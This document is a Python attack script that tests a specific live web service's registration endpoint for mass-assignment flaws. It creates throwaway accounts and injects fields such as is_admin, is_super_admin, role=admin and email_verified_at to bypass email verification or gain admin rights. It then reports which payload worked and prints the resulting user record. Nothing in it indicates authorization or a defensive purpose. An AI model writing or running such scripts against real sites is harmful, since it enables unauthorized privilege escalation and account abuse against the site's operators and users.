import requests, re, json, random, string

# Try mass assignment - send extra fields during registration
extra_fields = [
    {"email_verified_at": "2026-07-17T00:00:00Z"},
    {"email_verified_at": "2026-07-17 00:00:00"},
    {"is_admin": "1", "is_super_admin": "1"},
    {"role": "admin"},
    {"verified": "1"},
    {"status": "active"},
]

for extra in extra_fields:
    s2 = requests.Session()
    s2.headers.update({"User-Agent": "Mozilla/5.0"})
    r = s2.get("https://dash.reply.la/register", timeout=15)
    csrf2 = re.search(r'csrf-token" content="([^"]+)"', r.text).group(1)
    suffix2 = "".join(random.choices(string.ascii_lowercase, k=6))
    email2 = "ma" + suffix2 + "@web-library.net"
    
    data = {"_token": csrf2, "name": "MA" + suffix2[:4], "email": email2,
        "password": "TestPass789!", "password_confirmation": "TestPass789!",
        "whatsapp_number": "60123456780", "terms": "1"}
    data.update(extra)
    
    r2 = s2.post("https://dash.reply.la/register", data=data, allow_redirects=True, timeout=15)
    
    if "onboarding" in r2.url:
        r3 = s2.get("https://dash.reply.la/dashboard", headers={"X-Inertia": "true"}, timeout=10)
        if r3.status_code == 200:
            print("+++ BYPASS WORKED with " + str(extra))
            print("   Email: " + email2)
            m_dp = re.search(r'data-page=\\({(.+?)}\\)', r3.text, re.DOTALL)
            if m_dp:
                pg = json.loads(m_dp.group(1).replace('&quot;', '"'))
                user = pg.get("props",{}).get("auth",{}).get("user",{})
                print("   User: " + json.dumps(user, indent=2)[:300])
            break
        else:
            print("  - " + str(extra) + ": blocked (" + str(r3.status_code) + ")")
    elif "register" in r2.url:
        print("  - " + str(extra) + ": reg failed")
    else:
        print("  - " + str(extra) + ": " + r2.url[:60])
